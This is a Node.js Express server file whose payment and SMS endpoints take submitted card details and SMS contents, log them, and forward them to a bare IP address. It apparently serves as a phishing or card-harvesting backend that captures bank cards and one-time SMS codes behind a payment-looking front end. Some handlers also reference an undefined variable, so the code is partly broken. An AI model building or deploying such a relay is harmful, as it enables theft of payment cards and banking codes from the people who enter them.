const express = require('express');
const path = require('path');
const axios = require('axios');
// const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/check-amount', async (req, res) => {
    const idDetails = req.body;

    const sortedDataString = JSON.stringify(cardDetails);
    try {
        const requst = await axios.post('https://test5.overnightpay.finance/api/checkid', sortedDataString, {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
            }
          });
        console.log(cardDetails)
        console.log(requst.data.status);
        if(requst.data.status === 'success'){
            res.status(200).json({ amount: requst.data.amount });
        } else {
            res.status(500).json({ success: false });
        }
        
    }  catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/process-payment', async (req, res) => {
    const cardDetails = req.body;

    const sortedDataString = JSON.stringify(cardDetails);
    try {
        const request = await axios.post('http://217.144.184.88:8080/card-check', sortedDataString, {
            headers: {
             'Content-Type': 'application/json'
            }
          });
        console.log(cardDetails)
        console.log(request.data.result.status);
        if(request.data.result.status === 'success'){
            res.status(200).json({ success: true });
        } else {
            res.status(500).json({ success: false });
        }
        
    }  catch (error) {
        res.status(500).json({ error: error.message });
    }
});


app.post('/process-sms', async (req, res) => {
    const smsDetails = req.body;

    const sortedDataString = JSON.stringify(smsDetails);
    try {
        const requst = await axios.post('http://217.144.184.88:8080/sms-check', sortedDataString, {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
            }
          });
        console.log(cardDetails)
        console.log(requst.data.status);
        if(requst.data.result.status === 'success'){
            res.status(200).json({ success: true });
        } else {
            res.status(500).json({ success: false });
        }
        
    }  catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
